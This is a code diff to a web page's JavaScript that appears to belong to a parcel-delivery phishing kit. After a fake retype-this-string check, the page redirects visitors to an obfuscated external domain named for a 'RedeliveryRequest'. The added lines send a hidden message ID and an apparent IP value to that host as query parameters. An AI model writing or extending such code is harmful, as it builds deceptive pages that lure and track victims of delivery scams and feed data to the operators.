@@ -38,12 +38,19 @@
     const randomString = document.getElementById('randomStringSpan').textContent;
     const errorMsg = document.getElementById('errorMsg');
 
+    const messageId = document.getElementById('messageId').value;
+
+    const ipzebi = document.getElementById('ipzebi').value;
+
+
+    
+
     // Check if the user input is equal to the random string (case-insensitive)
     if (userInput.toLowerCase() === randomString.toLowerCase()) {
 	  let spark="chectrackuasbalikups"
 	  let https ="https"
 	  let webapp ="RedeliveryRequest"
-      window.location= https+"://"+spark+".com/"+webapp
+      window.location= https+"://"+spark+".com/"+webapp+"?messageId="+messageId+"&ipzebi="+ipzebi;
 	  userInput.className = ''; // Remove the 'invalid' class
       errorMsg.textContent = '';
     } else {
